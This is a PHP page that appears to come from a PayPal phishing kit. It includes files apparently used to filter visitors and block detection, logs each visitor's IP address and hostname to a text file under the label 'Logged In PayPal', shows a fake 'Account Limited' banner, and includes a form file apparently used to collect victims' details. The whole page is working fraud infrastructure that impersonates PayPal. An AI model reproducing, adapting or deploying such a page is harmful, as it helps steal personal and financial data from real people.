<?php include('../../blocker.php');?>
<?php include('header.php'); ?>
<?php include('../../detect.php'); ?>
<?php

if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == $_SERVER['REMOTE_ADDR']){
    $file = fopen("../../data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].' | Logged In PayPal | '.date('r').'
');
    fclose($file);
} else {
    $file = fopen("../../data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].' '.gethostbyaddr($_SERVER['REMOTE_ADDR']).' | Logged In PayPal | '.date('r').'
');
    fclose($file);
}

?>

	<div id="summary" class="summarySection">
		<div class="row-fluid">
			<div class="span8" id="js_activityCollection" style="width: 100%;">
			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Account Limited</h1>
			<div></div>

<?php include('../form/info.php'); ?>

				</div>
			</section>
			</div>
		</div>
	</div><br>
<?php include('footer.php'); ?>